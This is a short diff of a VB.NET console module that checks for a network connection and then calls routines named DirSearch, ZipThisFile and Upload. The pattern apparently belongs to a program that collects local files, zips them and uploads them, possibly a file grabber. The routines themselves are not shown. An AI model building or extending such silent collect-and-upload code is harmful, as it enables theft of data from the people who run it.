@@ -6,11 +6,16 @@ Imports System.Reflection
 'Author: NFC
 
 Module Module1
+    
     Private mypath As String = ChosenPath()
     Private zip As String = mypath + ".zip"
-    Public Sub Main()
-        If My.Computer.Network.IsAvailable Then
+    
+    Public Sub Main()     
+        If Not Directory.Exists(mypath) Then 
             Directory.CreateDirectory(mypath)
+        End If        
+        
+        If My.Computer.Network.IsAvailable Then            
             DirSearch()
             ZipThisFile()
             Upload()
